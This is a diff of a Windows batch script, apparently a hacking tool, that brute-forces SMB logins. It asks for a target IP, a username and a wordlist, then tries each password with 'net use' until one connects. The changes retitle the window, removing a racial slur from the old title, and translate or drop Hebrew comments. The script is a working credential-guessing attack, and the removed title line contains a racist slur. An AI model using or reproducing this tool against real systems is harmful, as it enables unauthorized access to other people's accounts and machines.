@@ -140,18 +140,18 @@ goto :start
 
 :c
 cls
-title The Nigger - Brute Force
+title The Brute Force
 color A
 echo.
 setlocal enabledelayedexpansion
 set /a count=1
 
-:: קלט מהמשתמש
+:: input from the user
 set /p ip="Enter IP Target: "
 set /p user="Enter Target Username: "
 set /p wordlist="Enter Password List: "
 
-:: קח את הסיסמאות מהרשימה ונסה להתחבר
+
 color 4
 for /f %%a in (%wordlist%) do (
     set pass=%%a
@@ -170,14 +170,13 @@ pause
 goto :start
 
 :attempt
-:: הדפסת הסיסמה הנוכחית לפני כל ניסיון
 
 net use \\%ip% /user:%user% !pass! >nul 2>&1
 
 :: אם חיבור הצליח, עבור להצלחה
 if %errorlevel% EQU 0 goto success
 
-:: הצגת הודעה אם החיבור נכשל
+
 echo [Attempt %count%] : [!pass!]
 set /a count=%count%+1
 
